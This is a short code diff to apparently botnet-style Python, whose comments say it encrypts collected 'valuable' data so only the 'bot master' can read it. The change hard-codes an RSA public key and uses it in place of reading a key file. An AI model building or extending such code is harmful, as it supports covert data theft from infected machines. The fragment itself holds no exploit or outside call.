@@ -4,6 +4,14 @@ from Crypto.Hash import SHA256
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP
 
+# Encryption key
+encryption_key = """ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCnLLxZ
+pqe+uL+KlM4/E6mSB9oM1XpND2K+fCo7APGglecOfAv3RmdGWRI3EIZ8SlhnWGe+
+yjBQshuBFVhvmeS4gE9E825s8K7QayR6cYd0wK3yQjW1ZDcPJLyWWSmSQaoZdnrR
+cLezWZGo/ZV/i6z/fhi0delIQPIJhGcQza7VWgxzwUkg4L2yTswzrQmO/qru4y1F
+amen0hfKTHLNKK/LjQuqzGNDTpy1nDXum3aMIXFEFA4/23z0mbNxssNmg6PEzjwm
+oyZYaWIZV9fHbiP+8nQ0GGN0P4R99/QtBOKYfa6sfYVw91aJYIqjl4r0ql8eHppB
+5U6YWmey/wnB9QS7"""
 # Verification key
 verification_key = """ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDMXG
 S37QSfTKnJrz5xX4tQbw9Kz+6Xkjd68ggLM74b0BYoP2RlUIGkZSWPoMWAXYU1k3
@@ -25,7 +33,7 @@ def save_valuable(data):
 
 def encrypt_for_master(data):
     # Encrypt the file so it can only be read by the bot master
-    key = RSA.importKey(open('skynet_encrypt.public').read())
+    key = RSA.importKey(encryption_key)
     cipher = PKCS1_OAEP.new(key)
     encrypted_data = cipher.encrypt(data)
     return encrypted_data
